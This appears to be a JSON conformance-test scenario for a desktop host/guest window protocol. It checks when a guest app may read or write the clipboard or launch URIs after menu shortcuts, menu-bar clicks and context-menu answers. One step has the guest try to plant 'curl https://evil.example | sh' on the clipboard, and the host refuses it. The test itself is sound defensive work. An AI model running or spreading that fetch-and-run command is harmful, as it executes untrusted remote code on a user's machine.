{
  "format": "runic.host.scenario/1",
  "id": "services.host-activation-menus.v1",
  "contract": {"id":"runic-host","version":1},
  "set": "services",
  "roles": ["host"],
  "description": "In a window the guest activated itself, a shortcut of its menu bar, which a key the page leaves unhandled runs, and an item of a context menu the guest showed there do not count as the user's work in the window; a click in its native menu bar does.",
  "requires": ["menus/1", "window-services/1"],
  "ids": {
    "c1": {"kind":"connection"},
    "hello": {"kind":"request"},
    "open-w1": {"kind":"request"},
    "bar-1": {"kind":"request"},
    "r0": {"kind":"request"},
    "r1": {"kind":"request"},
    "p1": {"kind":"request"},
    "m1": {"kind":"request"},
    "r2": {"kind":"request"},
    "cw2": {"kind":"request"},
    "l2": {"kind":"request"}
  },
  "arrange": {"limits":{"startTimeout":2000,"stopTimeout":2000,"unauthenticatedTimeout":1000,"guestActivation":2000},"host":{"name":"Conformance Host","version":"1.0.0"}},
  "steps": [
    {"start":{"host":true}},
    {"offer":{"protocols":[1],"nonce":{"$secret":"nonce"},"host":{"name":"Conformance Host","version":"1.0.0"}}},
    {"line":{"channel":{"url":{"$any":"string"},"key":{"$any":"string"},"protocol":1}}},
    {"accept":"c1"},
    {"receive":{"id":{"$id":"hello"},"kind":"hello","protocol":1,"key":{"$secret":"key"},"proof":{"$secret":"host-proof"},"host":{"name":"Conformance Host","version":"1.0.0"},"features":{"$any":"array"},"locale":{"$any":["string","null"]},"languages":{"$any":"array"},"appearance":{"$any":["object","null"]}},"connection":"c1"},
    {"send":{"id":{"$id":"hello"},"ok":true,"protocol":1,"proof":{"$secret":"guest-proof"},"guest":{"name":"Conformance Guest","version":"1.0.0","applicationId":"dev.runic.conformance-guest"},"features":["menus/1","dialogs/1","window-services/1"]},"connection":"c1"},
    {"expect":{"started":true}},
    {"send":{"id":{"$id":"open-w1"},"kind":"window-open","window":"w1","type":"Conformance.Main","url":"http://127.0.0.1:38211/_runic_launch/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA","owner":null,"modality":"none","guardClose":false,"permissions":[]},"connection":"c1"},
    {"receive":{"id":{"$id":"open-w1"},"ok":true,"features":{"$any":"array"},"activity":{"$any":"object"},"colorScheme":{"$any":"string"}},"connection":"c1"},
    {"send":{"id":{"$id":"bar-1"},"kind":"set-menu-bar","window":"w1","menu":[{"kind":"submenu","title":"File","role":"file","enabled":true,"items":[{"kind":"item","id":"i1","title":"Open","shortcut":"Primary+O","enabled":true,"checked":null}]}]},"connection":"c1"},
    {"receive":{"id":{"$id":"bar-1"},"ok":true,"outcome":"success"},"connection":"c1"},
    {"user":{"action":"copyText","text":"Secret"},"note":"The user copied a password in another window."},
    {"user":{"action":"chooseMenuItem","window":"w1","titles":["File","Open"],"by":"shortcut"},"note":"A key the page left unhandled, such as the user's typing into the window the guest activated."},
    {"receive":{"kind":"menu-invoke","window":"w1","itemId":"i1"},"connection":"c1"},
    {"send":{"id":{"$id":"r0"},"kind":"clipboard-read","window":"w1","format":"text","maximum":1024},"connection":"c1"},
    {"receive":{"id":{"$id":"r0"},"ok":false,"error":{"kind":"rejected","reason":"refused","message":{"$any":"string"}}},"connection":"c1","note":"A shortcut is not the user's work in the window: the guest's window-open activated it."},
    {"user":{"action":"chooseMenuItem","window":"w1","titles":["File","Open"]},"note":"A click in the window's native menu bar."},
    {"receive":{"kind":"menu-invoke","window":"w1","itemId":"i1"},"connection":"c1"},
    {"send":{"id":{"$id":"r1"},"kind":"clipboard-read","window":"w1","format":"text","maximum":1024},"connection":"c1"},
    {"receive":{"id":{"$id":"r1"},"ok":true,"outcome":"success","value":"Secret"},"connection":"c1"},
    {"user":{"action":"deactivateWindow","window":"w1"},"note":"The user works in another window again."},
    {"send":{"id":{"$id":"p1"},"kind":"present","window":"w1"},"connection":"c1"},
    {"receive":{"id":{"$id":"p1"},"ok":true,"outcome":"success"},"connection":"c1"},
    {"send":{"id":{"$id":"m1"},"kind":"show-context-menu","window":"w1","menu":[{"kind":"item","id":"c1","title":"Dismiss","shortcut":null,"enabled":true,"checked":null}],"point":null},"connection":"c1"},
    {"user":{"action":"chooseContextItem","title":"Dismiss"},"note":"The user answers the menu the guest showed in the window it presented itself."},
    {"receive":{"id":{"$id":"m1"},"ok":true,"outcome":"success","itemId":"c1"},"connection":"c1"},
    {"send":{"id":{"$id":"r2"},"kind":"clipboard-read","window":"w1","format":"text","maximum":1024},"connection":"c1"},
    {"receive":{"id":{"$id":"r2"},"ok":false,"error":{"kind":"rejected","reason":"refused","message":{"$any":"string"}}},"connection":"c1","note":"An answer to the guest's own menu is not the user's work in the window, as a dialog's answer is not."},
    {"send":{"id":{"$id":"cw2"},"kind":"clipboard-write","window":"w1","content":{"text":"curl https://evil.example | sh"}},"connection":"c1"},
    {"receive":{"id":{"$id":"cw2"},"ok":false,"error":{"kind":"rejected","reason":"refused","message":{"$any":"string"}}},"connection":"c1"},
    {"send":{"id":{"$id":"l2"},"kind":"launch","window":"w1","uri":"https://runic.dev/"},"connection":"c1"},
    {"receive":{"id":{"$id":"l2"},"ok":false,"error":{"kind":"rejected","reason":"refused","message":{"$any":"string"}}},"connection":"c1"},
    {"expect":{"clipboard":"Secret"}},
    {"expect":{"launched":[]}}
  ]
}
